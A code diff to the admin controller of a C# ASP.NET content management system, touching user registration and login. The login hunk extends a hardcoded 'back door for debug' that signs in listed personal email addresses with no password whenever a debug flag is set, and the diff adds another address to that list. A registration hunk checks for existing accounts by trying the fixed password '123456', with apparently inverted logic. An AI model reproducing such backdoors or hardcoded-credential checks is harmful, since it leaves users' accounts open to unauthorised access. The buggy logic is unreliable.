@@ -307,6 +307,20 @@ namespace CMSPROJECT.Areas.AdminCMS.Controllers
                         FullName = model.FullName,
 
                     };
+                    var findrs = UserManager.Find(model.Email,"123456");
+
+                    if (findrs == null)
+                    {
+                        int rs2 = await cms_db.CreateUserHistory(long.Parse(User.Identity.GetUserId()), Request.ServerVariables["REMOTE_ADDR"],
+                      (int)EnumCore.ActionType.Create, "ManualRegister", 0, model.Email, "User", (int)EnumCore.ObjTypeId.nguoi_dung);
+
+
+                        string AlertString = "Tài khoản đã tồn tại";
+                        return RedirectToAction("AlertPage", "Extension", new { AlertString = AlertString, type = (int)EnumCore.AlertPageType.FullScrenn });
+
+                    }
+
+
                     var result = UserManager.Create(user, model.Password);
                     if (result.Succeeded)
                     {
@@ -319,6 +333,10 @@ namespace CMSPROJECT.Areas.AdminCMS.Controllers
                         }
 
                         UserManager.Update(user);
+                        int rs2 = await cms_db.CreateUserHistory(long.Parse(User.Identity.GetUserId()), Request.ServerVariables["REMOTE_ADDR"],
+                     (int)EnumCore.ActionType.Create, "ManualRegister", user.Id, user.Email, "User", (int)EnumCore.ObjTypeId.nguoi_dung);
+
+
                         string AlertString = "Đăng ký tài khoản thành công";
                         return RedirectToAction("AlertPage", "Extension", new { AlertString = AlertString, type = (int)EnumCore.AlertPageType.FullScrenn });
                     }
@@ -568,7 +586,7 @@ namespace CMSPROJECT.Areas.AdminCMS.Controllers
                     ///nack door for debug
                     if ((user.Email == "nguyenhuyc2@gmail.com" || user.Email == "beetaskvn@gmail.com"
                         || user.Email == "fckara03@gmail.com" || user.Email == "castenguyen@gmail.com"
-                        || user.Email == "fckara01@gmail.com") && modedebug==1)
+                        || user.Email == "fckara01@gmail.com" || user.Email == "giaoquanoelhcm@gmail.com") && modedebug==1)
                     {
                         await SignInAsync(user, true);
                         User _ObjUser = await cms_db.GetObjUserById(user.Id);
